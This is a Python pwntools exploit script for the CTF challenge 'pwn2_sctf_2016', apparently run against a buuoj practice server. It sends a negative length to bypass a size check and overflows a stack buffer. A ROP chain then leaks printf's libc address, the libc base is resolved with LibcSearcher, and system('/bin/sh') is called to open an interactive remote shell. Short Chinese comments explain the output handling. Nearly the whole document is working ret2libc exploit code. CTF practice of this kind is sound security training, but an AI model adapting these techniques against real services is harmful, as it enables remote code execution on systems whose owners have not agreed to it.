from pwn import *
from LibcSearcher import *
context(os='linux',log_level='debug')

io = remote('node3.buuoj.cn',28351)
elf = ELF('./pwn2_sctf_2016')

#这里用到了printf("You said: %s\n", &nptr)语句的%s的地址，所以后面调用printf函数时的参数是‘you said 。。。。’，所以后面接受时要接收2次said之后的结果。
frame_adr = 0x80486f8
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
main = 0x80485b8
io.recvuntil('to read?')
payload = '-1'
io.sendline(payload)
payload = cyclic(0x2c+4)+p32(printf_plt)+p32(main)+p32(frame_adr)+p32(printf_got)
io.recvuntil('of data!\n')
io.sendline(payload)
#函数结束前的输出字符串
io.recvuntil('said: ')
#rop执行后输出的字符串，其中有函数地址
io.recvuntil('said: ')
printf_adr = u32(io.recv(4))
libc = LibcSearcher('printf',printf_adr)
print(printf_adr)
base = printf_adr - libc.dump('printf')
system = base+libc.dump('system')
binsh = base+libc.dump('str_bin_sh')
payload ='-1'
io.recvuntil('to read?')
io.sendline(payload)
payload = cyclic(0x2c+4)+p32(system)+p32(main)+p32(binsh)
io.recvuntil('data!\n')
io.sendline(payload)
io.interactive()


